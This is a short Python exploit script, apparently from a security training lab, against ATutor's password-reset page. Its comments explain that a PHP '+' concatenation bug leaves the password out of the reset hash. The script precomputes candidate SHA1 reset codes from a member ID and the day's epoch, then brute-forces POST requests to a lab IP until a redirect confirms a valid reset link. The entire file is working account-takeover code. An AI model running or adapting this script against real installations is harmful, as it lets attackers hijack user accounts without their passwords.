import requests
import sys
import hashlib
import string
import time

# the php vulnerability uses "+" for concatinating ID, epoch and password which works like it sounds in most languages but not PHP,
# in PHP you need to use "." to concatinate, the "+" will just treat it as a math problem
# additionally, it will only add digits and not letters.  
# So in our example we add ID + epoch + password, password will get left off because it can't be added to the numbers :) 

epoch = int(((int(time.time()) / 60) / 60) / 24)

def test_reset_hash(member_id, prefix_length):
	chars = range(0,10 ** prefix_length)
	codes = []
		
	for num in chars:
		to_hash = str(member_id + epoch + num)
		# has to be 5 - 20 because the hash has to be 15 chars long and starting at index 5
		hash_bit = hashlib.sha1(to_hash.encode()).hexdigest()[5:20]
		codes.append(str(hash_bit))
		
	return codes
	
def request_hash(member_id, prefix_length):
	codes = test_reset_hash(member_id, prefix_length)
	for code in codes:
		reset_url = f"http://192.168.193.103/ATutor/password_reminder.php?id={member_id}&g={epoch}&h={code}"
		reset_headers = {"Content-Type": "application/x-www-form-urlencoded"}
		reset_data = {"form_change": "true"}
		

		x = requests.post(reset_url, headers=reset_headers, data=reset_data, allow_redirects=False)
		print(x.status_code)
		if (x.status_code == 302):
			print(f'Success: {reset_url}', end='')
			return (True, reset_url)


def main():
    if len(sys.argv) != 3:
        print(f'(+) usage: {sys.argv[0]} <member_id> <prefix_length>')
        print(f'(+) eg: {sys.argv[0]} 1 2')
        sys.exit(-1)

    member_id = int(sys.argv[1])
    prefix_length = int(sys.argv[2])

    request_hash(member_id, prefix_length)
    

if __name__ == "__main__":
    main()
